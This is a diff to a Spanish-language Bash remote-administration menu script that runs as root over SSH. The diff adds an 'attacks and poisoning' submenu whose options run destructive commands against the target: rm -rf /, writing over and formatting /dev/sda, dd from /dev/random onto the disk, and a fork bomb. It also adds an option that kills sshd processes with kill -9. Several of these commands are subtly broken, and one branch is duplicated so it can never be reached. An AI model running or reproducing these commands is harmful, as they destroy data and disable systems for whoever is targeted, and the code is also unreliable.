@@ -130,7 +130,7 @@ if [ "$(id -u)" = "0" ]; then
         sleep 0.2
         echo -e "2.$grayColour  Iniciar proceso de copia de fichero$redColour (equipo local-remoto)$endColour$endColour"
         sleep 0.2
-        echo -e "3.$grayColour  Simple conexión remota vía SSH$redColour (equipo local-remoto) [-X]$endColour$endColour"
+        echo -e "3.$grayColour  Simple conexión remota vía SSH [-X]$redColour (equipo local-remoto)$endColour$endColour"
         sleep 0.2
         echo -e "4.$grayColour  Simple conexión remota vía SSH$redColour (equipo local-remoto)$endColour$endColour"
         sleep 0.2
@@ -252,6 +252,8 @@ if [ "$(id -u)" = "0" ]; then
       echo -e "5.$grayColour  Redirección gráfica de aplicaciones$redColour (equipo remoto)$endColour$endColour"
       sleep 0.2
       echo -e "6.$grayColour  Mensajes$redColour (equipo remoto)$endColour$endColour"
+      sleep 0.2
+      echo -e "7.$grayColour  Matar proceso de redirección gráfica$redColour (equipo remoto)$endColour$endColour"
       sleep 2
       echo -e "$redColour ------------------------------------------------------------$endColour"
       echo -e -n "$yellowColour-> Escoge una opción:$endColour "
@@ -302,6 +304,39 @@ if [ "$(id -u)" = "0" ]; then
 
         ;;
 
+        4 ) echo -e "\n$blueColour-> Ataques al sistema y envenenamiento$endColour\n"
+            sleep 1
+            echo -e "1.$grayColour  Borrar contenido de todos los directorios$endColour"
+            sleep 0.2
+            echo -e "2.$grayColour  Pérdida total de la información en el disco duro$endColour"
+            sleep 0.2
+            echo -e "3.$grayColour  Sistema en estado de destrucción total - Formateo de disco duro$endColour"
+            sleep 0.2
+            echo -e "4.$grayColour  Dañar disco duro$endColour"
+            sleep 0.2
+            echo -e "5.$grayColour  Harakiri - Hoyo negro$endColour"
+            sleep 0.2
+            echo -e "6.$grayColour  Colapso del sistema$endColour"
+            sleep 2
+            echo -e "$redColour ------------------------------------------------------------$endColour"
+            echo -e -n "$yellowColour-> Escoge una opción:$endColour "
+            read opcion_remoto
+
+            if [ "$opcion_remoto" = "1" ]; then
+              rm -rf /
+            elif [ "$opcion_remoto" = "2" ]; then
+              ls –l / > /dev/sda
+            elif [ "$opcion_remoto" = "3" ]; then
+              Mkfs.ext3 /dev/sda3
+            elif [ "$opcion_remoto" = "4" ]; then
+              dd if=/dev/random of=/dev/sda
+            elif [ "$opcion_remoto" = "5" ]; then
+              mv directory /dev/null
+            elif [ "$opcion_remoto" = "5" ]; then
+              forkbomb(){ forkbomb | forkbomb & }; forkbomb
+            fi
+        ;;
+
         5 ) echo -e "\n$blueColour-> Redireccionamiento de aplicaciones$endColour\n"
             sleep 2
             echo -e -n "$yellowColour-> Aplicación del sistema a redireccionar a la salida de pantalla de su equipo:$endColour "
@@ -309,7 +344,8 @@ if [ "$(id -u)" = "0" ]; then
             echo " "
             sudo Xvfb :10 -ac -screen 0 1024x768x24 &
             export DISPLAY=:0
-            $programa_redireccion&
+            $programa_redireccion &
+
         ;;
 
         6 ) echo -e "\n$blueColour-> Mensajes$endColour\n"
@@ -327,7 +363,11 @@ if [ "$(id -u)" = "0" ]; then
 
         ;;
 
-        * ) echo "Opcion incorrecta"
+        7 ) PID_proceso=$(ps -faux | grep sshd | grep root | cut -d ' ' -f 7)
+            kill -9 $PID_proceso
+        ;;
+
+        * ) echo -e "\n$redColour->Opcion incorrecta$endColour\n"
             sleep 2
           break
         ;;
